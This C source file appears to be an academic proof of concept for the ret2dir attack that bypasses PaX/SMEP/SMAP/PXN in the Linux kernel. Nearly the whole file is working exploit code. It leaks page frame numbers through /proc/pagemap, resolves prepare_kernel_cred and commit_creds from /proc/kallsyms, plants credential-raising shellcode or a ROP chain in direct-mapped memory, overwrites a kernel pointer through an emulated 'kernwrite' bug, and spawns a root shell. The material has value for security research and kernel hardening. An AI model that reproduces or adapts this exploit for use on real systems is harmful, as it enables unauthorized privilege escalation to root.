/*
 * Copyright (c) 2011, Columbia University
 * All rights reserved.
 *
 * This software was developed by Vasileios P. Kemerlis <vpk@cs.columbia.edu>
 * at Columbia University, New York, NY, USA, in May 2011.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 *   * Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *   * Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *   * Neither the name of Columbia University nor the
 *     names of its contributors may be used to endorse or promote products
 *     derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 */

#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <getopt.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

#include "shellcode.h"

/* unnecessary and boring */
#define __PROG__	"w00t"
#define __EXEC__	"w00t"
#define __VER__		"19042002be"
#define __COPYLEFT__	"Copyright 2011 Columbia University.\nThis is free software; see the source for copying conditions. There is NO\nwarranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE."
#define __BUGS__	"<vpk@cs.columbia.edu>"

/* constants */
#define PATH_SZ		32		/* path size (/proc/<pid>/pagemap) */
#define PRESENT_MASK	(1ULL << 63) 	/* get bit 63 from a 64-bit integer */
#define PFN_MASK	((1ULL << 55) - 1)	/* get bits 0-54 from
						   a 64-bit integer */
#define SYMNAME_SZ	1024		/* maximum size of symbol name */
#define ALLOC_STEP	1024*1024*512	/* chunk of 512MB */

#if	defined(__i386__)		/* x86 */
#define	ADDR_SZ		16			/* buffer size; 16 bytes */
#define PAGE_OFFSET	0xC0000000UL		/* kernel space */
#define	KERN_EXEC_LOW	PAGE_OFFSET		/* exec range start */
#define KERN_EXEC_HIGH	0xF7BFE000UL		/* exec range end */
#define	PFN_LOW_MAX	0x40000			/* maximum low memory PFN */
#elif	defined(__arm__)		/* ARM */
#define	ADDR_SZ		16			/* buffer size; 16 bytes */
#define PHYS_OFFSET	0x60000000UL		/* physical memory offset */
#define PAGE_OFFSET	0xC0000000UL		/* kernel space */
#define	KERN_EXEC_LOW	PAGE_OFFSET		/* exec range start */
#define KERN_EXEC_HIGH	0xEF7FFFFFUL		/* exec range end */
#define	PFN_LOW_MAX	0xA0000			/* maximum low memory PFN */
#elif	defined(__x86_64__)		/* x86-64 */
#define	ADDR_SZ 	32			/* buffer size; 32 bytes */
#define PAGE_OFFSET	0xFFFF880000000000UL	/* kernel space */
#define	KERN_EXEC_LOW	0xFFFF880030400000UL	/* exec range start */
#define KERN_EXEC_HIGH	0xFFFF880080000000UL	/* exec range end */
#endif

enum {
	MODE_UNSPEC	= -1,			/* unspecified mode	*/
	MODE_FPTR 	= 0,			/* fptr mode		*/
	MODE_DPTR 	= 1,			/* dptr mode		*/
	MODE_ROP 	= 2			/* rop mode		*/
};


/* pagemap query result (see querypmap()) */
struct pmap_qres {
	unsigned long	btarget;	/* branch target 	*/
	size_t		pnum;		/* page number 		*/
};

/* 
 * template for the data structure that we will tamper
 * (used only when we overwrite a kernel-mapped data pointer)
 */
struct dummy_ops {
	size_t	val;			/* generic field	*/
	ssize_t (*fptr)(void);		/* function pointer	*/
};


/*
 * help
 *
 * display usage information
 */
static void
help(void)
{
	/* usage info */
	fprintf(stdout, "Usage: %s [OPTION]...\n", __EXEC__);
	fprintf(stdout, "Demonstrate PaX/SMEP/SMAP/PXN bypass.\n\n");

	/* options */
	fprintf(stdout,
		"\t-f, --fptr\t\toverwrite a kernel-mapped function pointer\n");
	fprintf(stdout,
		"\t-d, --dptr\t\toverwrite a kernel-mapped data pointer\n");
	fprintf(stdout,
		"\t-r, --rop\t\tlike -d (--dptr) + ROP (3.8.0 i386 only)\n");
	fprintf(stdout,
		"\t-p, --paddr=NUM\t\t`prepare_kernel_cred' virtual address\n");
	fprintf(stdout,
		"\t-c, --caddr=NUM\t\t`commit_cred' virtual address\n");
	fprintf(stdout, "\t-h, --help\t\tdisplay this help and exit\n");
	fprintf(stdout,
		"\t-v, --version\t\tprint version information and exit\n\n");

	/* bugs */
	fprintf(stdout, "Report bugs to %s\n", __BUGS__);
} 

/*
 * version
 *
 * display version information
 */
static void
version(void)
{
	/* display version */
	fprintf(stdout, "%s %s\n\n", __PROG__, __VER__);
	/* copyright info */
	fprintf(stdout, "%s\n", __COPYLEFT__); 
}

/* 
 * find a kernel symbol in /proc/kallsyms
 *
 * @name:	the name (string) of a symbol to search for
 * returns:	the address of the symbol (if found) or 0 otherwise
 */
static unsigned long 
get_ksym(char *name)
{
	/* file pointer	*/
	FILE 	*f	= NULL;

	/* helpers 	*/
	char c, sym[SYMNAME_SZ];
	void	 *addr	= NULL;


	/* open /proc/kallsyms */
	if ((f = fopen("/proc/kallsyms", "r")) == NULL)
		/* failed */
		errx(3,
			"[Fail] couldn't open /proc/kallsyms -- %s",
			strerror(errno));

	/* read kallsyms */
	while(fscanf(f, "%p %c %s\n", &addr, &c, sym) > 0)
		if (strlen(sym) == strlen(name) &&
				(strncmp(sym, name, strlen(sym)) == 0))
			/* symbol found; return its address */
			break;
		else
			/* symbol not found */
			addr = NULL;

	/* cleanup */
	fclose(f);
	
	/* return the symbol address (or 0)  */
	return (unsigned long)addr;
}

/*
 * query the pagemap
 *
 * open /proc/<pid>/pagemap and try to find the 1st page from a range of
 * user space pages that falls inside [KERN_EXEC_LOW, KERN_EXEC_HIGH]
 * (i.e., in the direct-mapped RAM region in kernel space)
 *
 * @pid:	the pid of the process that we are interested into
 * @vaddr:	starting virtual address (page-aligned)
 * @psize:	page size
 * @pnum:	number of pages in the range
 * returns:	a `struct pmap_qres' (i.e., the kernel address of a vaddr,
 * 			or 0 if no vaddr is kernel-mapped/present, and the
 * 			page number for vaddr)
 */
static struct pmap_qres
querypmap(pid_t pid, unsigned long vaddr, long psize, size_t pnum)
{
	/* path in /proc 	*/
	char 			path[PATH_SZ];

	/* pagemap entries	*/
	uint64_t 		*pentry	= NULL;

	/* pagemap file		*/
	FILE 			*fp	= NULL;

	/* return value		*/
	struct pmap_qres 	rval	= {0, 0};

	/* helper */
	unsigned long 		kaddr	= 0;


	/* initialize the pagemap entries */
	if ((pentry = calloc(pnum, sizeof(uint64_t))) == NULL)
		errx(7,
		"[Fail] couldn't allocate memory for pagemap entries -- %s",
				strerror(errno));

	/* cleanup */
	memset(path, 0, PATH_SZ);

	/* format the path variable */
	if (snprintf(path, PATH_SZ, "/proc/%d/pagemap", pid) >= PATH_SZ)
		/* failed */
		errx(4,
			"[Fail] invalid path for /proc/%d/pagemap -- %s",
			pid,
			path);
	
	/* open the pagemap file */
	if ((fp = fopen(path, "r")) == NULL)
		/* failed */
		errx(4,
			"[Fail] couldn't open %s -- %s",
			path,
			strerror(errno));

	/* seek to the appropriate place */
	if (fseek(fp, (vaddr / psize) * sizeof(uint64_t), SEEK_CUR) == -1)
		/* failed */
		errx(5,
			"[Fail] couldn't seek in pagemap -- %s",
			strerror(errno));

	/* read the corresponding pagemap entries */
	if (fread(pentry, sizeof(uint64_t), pnum, fp) != pnum)
		errx(6,
			"[Fail] couldn't read pagemap entries -- %s",
			strerror(errno));
	
	/* iterate the pagemap entries */
	vaddr += ((pnum - 1) * psize);
	while (pnum > 0) {
#if	defined(__x86_64__)		/* x86-64 */
		/* check the present bit */
		if ((pentry[pnum - 1] & PRESENT_MASK) == 0) {
			/* page not present */
			warnx("[Warn] %#lx is not present in physical memory",
					vaddr);
#else
		/* check the present bit */
		if (((pentry[pnum - 1] & PRESENT_MASK) == 0)	||
			((pentry[pnum - 1] & PFN_MASK) > PFN_LOW_MAX)) {
			/* page not present in low memory */
			warnx("[Warn] %#lx is not present in low memory",
					vaddr);
#endif
			/* proper accounting */
			kaddr	= 0;
			vaddr	-= psize;
			pnum--;
			
			/* continue with the next page */	
			continue;
		}

		/* get the kernel-mapped address of vaddr */
		kaddr = ((pentry[pnum - 1] & PFN_MASK) * psize)	+
			PAGE_OFFSET 				+
			(vaddr & (psize - 1));

#if	defined(__arm__)
		kaddr -= PHYS_OFFSET;
#endif

		/* verbose */
		fprintf(stdout,
				"\r[*] %#lx is kernel-mapped at %#lx",
				vaddr,
				kaddr);
		
		/* valid match ? */
		if (kaddr >= KERN_EXEC_LOW && kaddr <= KERN_EXEC_HIGH) 
			/* yeah baby */
			break;

		/* proper accounting */
		kaddr	= 0;
		vaddr	-= psize;
		pnum--;
	}

	/* cleanup */
	fclose(fp);
	fprintf(stdout, "\n");
	
	/* prepare the query result and return */
	rval.btarget	= kaddr;
	rval.pnum	= pnum - 1;
	return rval;
}

/*
 * ret2dir via function pointer overwrite
 *
 * attack plan:
 * 	i. we begin with acquiring memory pages in user space, progressively,
 * 		and check if their addresses fall inside the direct-mapped RAM
 * 		region in kernel space (this is done via leaking the PFN of each
 * 		page via /proc/<pid>/pagemap)
 *
 * 	ii. upon finding a user page whose directly-mapped counterpart falls
 * 		inside a RWX region in kernel (e.g., say 0x0000031d6b049000 is
 * 		directly-mapped at 0xffff88003ffb5000), we copy the respective
 * 		shellcode to the user page, thus making it available to kernel
 * 		space as well
 *
 * 	iii. we overwrite a kernel-mapped function pointer with an arbitrary,
 * 		user-controlled value (we use `kernwrite' for that task,
 * 		which emulates a vulnerability that allows us to overwrite
 * 		a function pointer and invoke it), and point it to the page
 * 		inside the direct-mapped region that contains the shellcode 
 *
 * @psize:	page size
 * @paddr:	`prepare_kernel_cred' address
 * @caddr:	`commit_creds' address	
 */
static void
p0wn_fptr(long psize, unsigned long paddr, unsigned long caddr)
{
	char 	*code		= NULL;	/* shellcode buffer */
	char	saddr[ADDR_SZ];		/* shellcode address as a string */
	int	fd		= -1;	/* file descriptor */
	struct 	pmap_qres res	= {0, 0};/* kernel-level address of shellcode */
	char	*argv[]		= {"/bin/sh", NULL};	/* rootshell */


	/* allocate ALLOC_STEP bytes in user space */
	if ((code = mmap(NULL,
			ALLOC_STEP,
			PROT_READ | PROT_WRITE, 
			MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, 
			-1,
			0)) == MAP_FAILED)
		/* failed */
		errx(7,
		"[Fail] couldn't allocate memory -- %s", strerror(errno));

	/* see if user space is kernel-mapped */
	res = querypmap(getpid(),
			(unsigned long)code,
			psize,
			ALLOC_STEP / psize);

	/* bad luck; try again */
	while(res.btarget == 0) {
		/* allocate ALLOC_STEP bytes in user space */
		if ((code = mmap(NULL,
			ALLOC_STEP,
			PROT_READ | PROT_WRITE, 
			MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
			-1,
			0)) == MAP_FAILED)
			/* failed */
			errx(7,
			"[Fail] couldn't allocate memory -- %s",
				strerror(errno));
	
		/* see if user space is kernel-mapped */
		res = querypmap(getpid(),
				(unsigned long)code,
				psize,
				ALLOC_STEP / psize);
	}

	/* shellcode stitching */
	code += res.pnum * psize;
	memcpy(code, shell_tmpl, SHELL_PREFIX);
				code += SHELL_PREFIX;
	memcpy(code, &caddr, sizeof(unsigned));
				code += sizeof(unsigned);
	memcpy(code, &shell_tmpl[SHELL_PREFIX], SHELL_ADV);
				code += SHELL_ADV;
	memcpy(code, &paddr, sizeof(unsigned));
				code += sizeof(unsigned);
	memcpy(code, &shell_tmpl[SHELL_PREFIX + SHELL_ADV], SHELL_SUFFIX);
					
	/* prepare to overwrite a function pointer via `kernwrite' */
	memset(saddr, 0, ADDR_SZ);
	sprintf(saddr, "%#lx", res.btarget);
	/* verbose */
	fprintf(stdout, "[+] shellcode is at %s\n", saddr);
	
	/* do it (kernwrite specific) */
	if ((fd = open("/sys/kernel/debug/kernwrite/over_func_ptr",
					O_WRONLY)) == -1)
		errx(8, "[Fail] couldn't open %s -- %s",
				"/sys/kernel/debug/kernwrite/over_func_ptr",
				strerror(errno));
	if (write(fd, saddr, strlen(saddr)) != strlen(saddr))
		errx(8, "[Fail] couldn't write in %s -- %s",
				"/sys/kernel/debug/kernwrite/over_func_ptr",
				strerror(errno));
	close(fd);

	if ((fd = open("/sys/kernel/debug/kernwrite/invoke_func",
					O_WRONLY)) == -1)
		errx(9, "[Fail] couldn't open %s -- %s",
				"/sys/kernel/debug/kernwrite/invoke_func",
				strerror(errno));
	if (write(fd, "1", 1) == -1)
		errx(9, "[Fail] couldn't write in %s -- %s",
				"/sys/kernel/debug/kernwrite/invoke_func",
				strerror(errno));
	close(fd);
	
	/* check to see if we succeeded */
	if (getuid() == 0) {
		/* verbose */
		fprintf(stderr, "[+] p0wned [^_-]\n");

		/* execute a rootshell */
		execve("/bin/sh", argv, NULL);
	}

	/* l0Ooser */
	fprintf(stderr, "[-] failed to p0wn the machine\n");
}

/*
 * ret2dir via data pointer overwrite
 *
 * attack plan:
 * 	i. we begin with acquiring memory pages in user space, progressively,
 * 		and check if their addresses fall inside the direct-mapped RAM
 * 		region in kernel space (this is done via leaking the PFN of each
 * 		page via /proc/<pid>/pagemap)
 *
 * 	ii. upon finding a user page whose directly-mapped counterpart falls
 * 		inside a RWX region in kernel (e.g., say 0x0000031d6b049000 is
 * 		directly-mapped at 0xffff88003ffb5000), we copy the respective
 * 		data strucrure and shellcode to the user page, thus making them
 * 		available to kernel space as well
 *
 * 	iii. we overwrite a kernel-mapped data pointer with an arbitrary,
 * 		user-controlled value (we use `kernwrite' for that task,
 * 		which emulates a vulnerability that allows us to overwrite
 * 		a data pointer and dereference it), and point it to the page
 * 		inside the direct-mapped region that contains the tampered-with
 * 		data structure and shellcode
 *
 * @psize:	page size
 * @paddr:	`prepare_kernel_cred' address
 * @caddr:	`commit_creds' address	
 */
static void
p0wn_dptr(long psize, unsigned long paddr, unsigned long caddr)
{
	char 	*code		= NULL;	/* shellcode buffer */
	char	saddr[ADDR_SZ];		/* shellcode address as a string */
	int	fd		= -1;	/* file descriptor */
	struct pmap_qres res	= {0, 0};/* kernel-level address of shellcode */
	struct	dummy_ops dops;		/* tampered-with data structure */
	char	*argv[]	= {"/bin/sh", NULL};	/* rootshell */


	/* allocate ALLOC_STEP bytes in user space */
	if ((code = mmap(NULL,
			ALLOC_STEP,
			PROT_READ | PROT_WRITE,
			MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
			-1,
			0)) == MAP_FAILED)
		/* failed */
		errx(7,
		"[Fail] couldn't allocate memory -- %s", strerror(errno));
	
	/* see if user space is kernel-mapped */
	res = querypmap(getpid(),
			(unsigned long)code,
			psize,
			ALLOC_STEP / psize);
	
	/* bad luck; try again */
	while(res.btarget == 0) {
		/* allocate ALLOC_STEP bytes in user space */
		if ((code = mmap(NULL,
			ALLOC_STEP,
			PROT_READ | PROT_WRITE, 
			MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
			-1,
			0)) == MAP_FAILED)
			/* failed */
			errx(7,
			"[Fail] couldn't allocate memory -- %s",
				strerror(errno));
		
		/* see if user space is kernel-mapped */
		res = querypmap(getpid(),
				(unsigned long)code,
				psize,
				ALLOC_STEP / psize);
	}

	/* copy the tampered-with data structure into the appropriate place */
	code += res.pnum * psize;

	/* set the function pointer accordingly (i.e., to the shellcode) */
	dops.fptr = (void *)(res.btarget + sizeof(struct dummy_ops));
	memcpy(code, &dops, sizeof(struct dummy_ops));
				code += sizeof(struct dummy_ops);

	/* shellcode stitching */
	memcpy(code, shell_tmpl, SHELL_PREFIX);
				code += SHELL_PREFIX;
	memcpy(code, &caddr, sizeof(unsigned));
				code += sizeof(unsigned);
	memcpy(code, &shell_tmpl[SHELL_PREFIX], SHELL_ADV);
				code += SHELL_ADV;
	memcpy(code, &paddr, sizeof(unsigned));
				code += sizeof(unsigned);
	memcpy(code, &shell_tmpl[SHELL_PREFIX + SHELL_ADV], SHELL_SUFFIX);
					
	/* prepare to overwrite a data pointer via `kernwrite' */
	memset(saddr, 0, ADDR_SZ);
	sprintf(saddr, "%#lx", res.btarget);
	/* verbose */
	fprintf(stdout, "[+] tampered-with data stucture is at %s\n", saddr);
	fprintf(stdout, "[+] shellcode is at %p\n", dops.fptr);
	
	/* do it (kernwrite specific) */
	if ((fd = open("/sys/kernel/debug/kernwrite/over_data_ptr",
					O_WRONLY)) == -1)
		errx(8, "[Fail] couldn't open %s -- %s",
				"/sys/kernel/debug/kernwrite/over_data_ptr",
				strerror(errno));
	if (write(fd, saddr, strlen(saddr)) != strlen(saddr))
		errx(8, "[Fail] couldn't write in %s -- %s",
				"/sys/kernel/debug/kernwrite/over_data_ptr",
				strerror(errno));
	close(fd);
	
	if ((fd = open("/sys/kernel/debug/kernwrite/invoke_func",
					O_WRONLY)) == -1)
		errx(9, "[Fail] couldn't open %s -- %s",
				"/sys/kernel/debug/kernwrite/invoke_func",
				strerror(errno));
	if (write(fd, "1", 1) == -1)
		errx(9, "[Fail] coudldn't write in %s -- %s",
				"/sys/kernel/debug/kernwrite/invoke_func",
				strerror(errno));
	close(fd);

	/* check to see if we succeeded */
	if (getuid() == 0) {
		/* verbose */
		fprintf(stderr, "[+] p0wned [^_-]\n");

		/* execute a rootshell */
		execve("/bin/sh", argv, NULL);
	}

	/* l0Ooser */
	fprintf(stderr, "[-] failed to p0wn the machine\n");
}

#if	defined(__i386__)
/*
 * ret2dir via data pointer overwrite + ROP
 *
 * attack plan:
 * 	i. we begin with acquiring memory pages in user space, progressively,
 * 		and check if their addresses fall inside the direct-mapped RAM
 * 		region in kernel space (this is done via leaking the PFN of each
 * 		page via /proc/<pid>/pagemap)
 *
 * 	ii. upon finding a user page whose directly-mapped counterpart falls
 * 		inside a region in kernel (e.g., say 0x0000031d6b049000 is
 * 		directly-mapped at 0xffff88003ffb5000), we copy the respective
 * 		data strucrure and ROP payload to the user page, thus making
 * 		them available to kernel space as well
 *
 * 	iii. we overwrite a kernel-mapped data pointer with an arbitrary,
 * 		user-controlled value (we use `kernwrite' for that task,
 * 		which emulates a vulnerability that allows us to overwrite
 * 		a data pointer and dereference it), and point it to the page
 * 		inside the direct-mapped region that contains the
 * 		tampered-with data structure and ROP payload 
 *
 * @psize:	page size
 * @paddr:	`prepare_kernel_cred' address
 * @caddr:	`commit_creds' address	
 */
static void
p0wn_dptr_rop(long psize)
{
	char 	*code		= NULL;	/* ROP payload buffer */
	char	saddr[ADDR_SZ];		/* payload address as a string */
	int	fd		= -1;	/* file descriptor */
	struct pmap_qres res	= {0, 0};/* kernel-level address of payload */
	struct	dummy_ops dops;		/* tampered-with data structure */
	char	*argv[]	= {"/bin/sh", NULL};	/* rootshell */


	/* allocate ALLOC_STEP bytes in user space */
	if ((code = mmap(NULL,
			ALLOC_STEP,
			PROT_READ | PROT_WRITE,
			MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
			-1,
			0)) == MAP_FAILED)
		/* failed */
		errx(7,
		"[Fail] couldn't allocate memory -- %s", strerror(errno));
	
	/* see if user space is kernel-mapped */
	res = querypmap(getpid(),
			(unsigned long)code,
			psize,
			ALLOC_STEP / psize);
	
	/* bad luck; try again */
	while(res.btarget == 0) {
		/* allocate ALLOC_STEP bytes in user space */
		if ((code = mmap(NULL,
			ALLOC_STEP,
			PROT_READ | PROT_WRITE, 
			MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
			-1,
			0)) == MAP_FAILED)
			/* failed */
			errx(7,
			"[Fail] couldn't allocate memory -- %s",
				strerror(errno));
		
		/* see if user space is kernel-mapped */
		res = querypmap(getpid(),
				(unsigned long)code,
				psize,
				ALLOC_STEP / psize);
	}

	/* copy the tampered-with data structure into the appropriate place */
	code += (res.pnum * psize) + USTACK_SZ; 

	/* set the function pointer accordingly (i.e., to the ROP payload) */
	dops.fptr = (void *)STACK_PIVOT;
	/* initialize scratch space */
	*(unsigned *)(rop_tmpl + SAVE_ESP_OFF) = res.btarget;
	*(unsigned *)(rop_tmpl + SAVE_EBP_OFF) = res.btarget + sizeof(unsigned);
	*(unsigned *)(rop_tmpl + REST_EBP_OFF) = res.btarget + sizeof(unsigned);
	*(unsigned *)(rop_tmpl + REST_ESP_OFF) = res.btarget;
	memcpy(code, &dops, sizeof(struct dummy_ops));
	/* copy the ROP payload */
	memcpy(code, rop_tmpl, sizeof(unsigned));
				code += (sizeof(struct dummy_ops));
	memcpy(code, rop_tmpl + sizeof(unsigned), ROP_SZ);

	/* prepare to overwrite a data pointer via `kernwrite' */
	memset(saddr, 0, ADDR_SZ);
	sprintf(saddr, "%#lx", res.btarget + USTACK_SZ);
	/* verbose */
	fprintf(stdout, "[+] tampered-with data stucture is at %s\n", saddr);
	fprintf(stdout, "[+] ROP starts with %p\n", dops.fptr);
	
	/* do it (kernwrite specific) */
	if ((fd = open("/sys/kernel/debug/kernwrite/over_data_ptr",
					O_WRONLY)) == -1)
		errx(8, "[Fail] couldn't open %s -- %s",
				"/sys/kernel/debug/kernwrite/over_data_ptr",
				strerror(errno));
	if (write(fd, saddr, strlen(saddr)) != strlen(saddr))
		errx(8, "[Fail] couldn't write in %s -- %s",
				"/sys/kernel/debug/kernwrite/over_data_ptr",
				strerror(errno));
	close(fd);
	
	if ((fd = open("/sys/kernel/debug/kernwrite/invoke_func",
					O_WRONLY)) == -1)
		errx(9, "[Fail] couldn't open %s -- %s",
				"/sys/kernel/debug/kernwrite/invoke_func",
				strerror(errno));
	if (write(fd, "1", 1) == -1)
		errx(9, "[Fail] coudldn't write in %s -- %s",
				"/sys/kernel/debug/kernwrite/invoke_func",
				strerror(errno));
	close(fd);

	/* check to see if we succeeded */
	if (getuid() == 0) {
		/* verbose */
		fprintf(stderr, "[+] p0wned [^_-]\n");

		/* execute a rootshell */
		execve("/bin/sh", argv, NULL);
	}

	/* l0Ooser */
	fprintf(stderr, "[-] failed to p0wn the machine\n");
}
#endif

/*
 * w00t
 *
 * demonstrates how PaX/SMEP/SMAP/PXN can be bypassed by launching
 * a ret2dir attack for executing user-provided code, in kernel mode,
 * *without* crossing the kernel/user space boundary (i.e., perform
 * a ret2usr attack) or explicitly injecting the code in kernel memory
 *
 * The exploitation procedure builds upon the following:
 * 	i. a vulnerability that allows overwriting a kernel-level function/data
 * 		pointer with arbitrary user-controlled values (we use the
 * 		`kernwrite' module to inject a vulnerability)
 *
 * 	ii. page frame (PFN) information that is leaked from /proc/<pid>/pagemap
 *
 * 	iii. the fact that physical memory (RAM) is direct-mapped inside the
 * 		kernel space starting from PAGE_OFFSET (0xC0000000,
 * 		0xFFFF880000000000)
 *
 * @argc:	number of command-line options
 * @argv:	command-line options
 * returns:	0 on success or >=1 on failure
 */
int
main(int argc, char **argv)
{
	int		mode	= MODE_UNSPEC;	/* 0 = fptr, 1 = dptr 	*/
						/* kernel addresses	*/
	unsigned long	paddr	= 0;		/* prepare_kernel_cred 	*/
	unsigned long	caddr	= 0;		/* commit_creds 	*/

	long psize;				/* page size		*/

	/* getopt stuff */
	int opt;				/* option		*/
	int long_opt_indx	= 0;		/* long option index	*/

	/* long options */
	struct option long_options[] = {
		{"fptr",	0, NULL, 'f'},	/* -f / --fptr		*/
		{"dptr",	0, NULL, 'd'},	/* -d / --dptr		*/
		{"rop",		0, NULL, 'r'},	/* -r / --rop		*/
		{"paddr",	1, NULL, 'p'},	/* -p / --paddr		*/
		{"caddr",	1, NULL, 'c'},	/* -c / --caddr		*/
		{"help",	0, NULL, 'h'},	/* -h / --help		*/
		{"version",	0, NULL, 'v'},	/* -v / --version	*/
		{NULL,		0, NULL, 0}};	/* terminating item	*/


	/* arguments parsing */
	while ((opt = getopt_long(argc,
				argv,
				":hvfdrp:c:",
				long_options,
				&long_opt_indx)) != -1) {
		switch(opt) {
			case 'f': /* -f / --fptr */
				mode	= MODE_FPTR;
				break;
			case 'd': /* -d / --dptr */
				mode	= MODE_DPTR;
				break;
			case 'r': /* -r / --rop */
				mode	= MODE_ROP;
				break;
			case 'p': /* -p / --paddr */
				paddr	= strtoul(optarg, NULL, 0);
				break;
			case 'c': /* -c / --caddr */
				caddr	= strtoul(optarg, NULL, 0);
				break;
			case 'h': /* help */
				help();
				goto done;
				break;	/* not reached */
			case 'v': /* version info */
				version();
				goto done;
				break;	/* not reached */
			case '?': /* illegal option */
				errx(1,
					"[Fail] illegal option -- %s",
					(optind == 0) 		?
					argv[long_opt_indx] 	:
					argv[optind - 1]);
				break;
			case ':': /* missing argument */
				errx(1,
				"[Fail] option requires an argument -- %s",
					(optind == 0) 		?
					argv[long_opt_indx] 	:
					argv[optind - 1]);
				break;
			default: /* not reached */
				break; /* make the compiler happy */
		}
	} 
	
	/* get the page size */
	if ((psize = sysconf(_SC_PAGESIZE)) == -1)
		/* failed */
		errx(2,
			"[Fail] couldn't read page size -- %s",
			strerror(errno));
	
	/* validate arguments */

	/* fptr vs. dptr */
	if (mode == MODE_UNSPEC) {
		/* verbose */
		warnx("[Warn] `mode' was not specified -- using -f (--fptr)");
		/* set mode to fptr */
		mode = MODE_FPTR;
	}
	
	/* address for `prepare_kernel_cred' */
	if ((paddr < PAGE_OFFSET) && (mode != MODE_ROP)) {
		/* verbose */
		warnx("[Warn] invalid `prepare_kernel_cred' address -- %#lx",
				paddr);

		/* try to auto-detect it */
		if ((paddr = get_ksym("prepare_kernel_cred")) != 0)
			/* yes! */
			fprintf(stdout,
				"[*] `prepare_kernel_cred' at %#lx\n",
				paddr);
		else
			/* failed */
			errx(3, "[Fail] couldn't determine the address of `prepare_kernel_cred'");
	}
	
	/* address for `commit_creds' */
	if ((caddr < PAGE_OFFSET) && (mode != MODE_ROP)) {
		/* verbose */
		warnx("[Warn] invalid `commit_creds' address -- %#lx", caddr);
	
		/* try to auto-detect it */
		if ((caddr = get_ksym("commit_creds")) != 0)
			/* yes! */
			fprintf(stdout,
				"[*] `commit_creds' at %#lx\n", caddr);
		else
			/* failed */
			errx(3, "[Fail] couldn't determine the address of `commit_creds'");
	}
	
	/* differentiate based on the supplied mode */
	switch (mode) {
		case MODE_FPTR:	/* -f / --fptr supplied */
			p0wn_fptr(psize, paddr, caddr);
			break;
		case MODE_DPTR:	/* -d / --dptr supplied */
			p0wn_dptr(psize, paddr, caddr);
			break;
#if	defined(__i386__)
		case MODE_ROP:	/* -r / --rop supplied */
			p0wn_dptr_rop(psize);
			break;
#endif
		default:	/* not reached */
			break;	/* make the compiler happy */
	}

done:	/* done; return with success */
	return EXIT_SUCCESS;
}
